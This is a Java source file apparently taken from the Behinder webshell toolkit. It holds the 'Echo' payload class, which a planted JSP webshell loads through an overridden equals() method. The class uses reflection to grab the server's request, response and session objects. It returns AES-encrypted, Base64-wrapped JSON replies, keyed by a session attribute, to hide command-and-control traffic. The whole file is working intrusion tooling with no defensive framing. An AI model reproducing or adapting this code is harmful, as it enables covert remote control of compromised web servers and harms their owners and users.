package net.rebeyond.behinder.payload.java;

import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Echo {
    public static String content;
    private Object Request;
    private Object Response;
    private Object Session;

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            fillContext(obj);
            result.put("status", "success");
            result.put("msg", content);
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            } catch (Exception e) {
            }
        } catch (Exception e2) {
            result.put("msg", e2.getMessage());
            result.put("status", "success");
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
            } catch (Exception e3) {
            }
        } catch (Throwable th) {
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
            } catch (Exception e4) {
            }
            throw th;
        }
        return true;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
}
